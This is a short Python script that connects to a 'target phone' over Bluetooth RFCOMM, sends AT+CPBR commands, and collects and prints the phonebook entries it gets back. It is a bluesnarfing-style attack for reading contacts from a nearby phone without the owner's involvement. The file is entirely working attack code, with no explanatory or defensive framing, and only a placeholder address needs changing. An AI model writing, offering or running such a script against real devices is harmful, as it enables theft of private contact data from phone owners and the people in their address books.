import bluetooth

def fetch_contacts(target_phone, port, contact_range):
    try:
        print(f"Connecting to {target_phone} on port {port}...")
        phone_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        phone_sock.connect((target_phone, port))
        print("Connection established.")
        
        contacts = []
        for contact in contact_range:
            at_cmd = f'AT+CPBR={contact}\n'
            print(f"Sending command: {at_cmd}")
            phone_sock.send(at_cmd)
            result = phone_sock.recv(1024).decode('utf-8')
            print(f"Received result: {result}")
            contacts.append((contact, result))
            print(f'[+] {contact}: {result}')
        
        phone_sock.close()
        return contacts

    except bluetooth.btcommon.BluetoothError as err:
        print(f"Bluetooth error: {err}")
        return []

if __name__ == "__main__":
    TARGET_PHONE = 'AA:BB:CC:DD:EE:FF'
    PORT = 17
    CONTACT_RANGE = range(1, 5)
    
    fetch_contacts(TARGET_PHONE, PORT, CONTACT_RANGE)
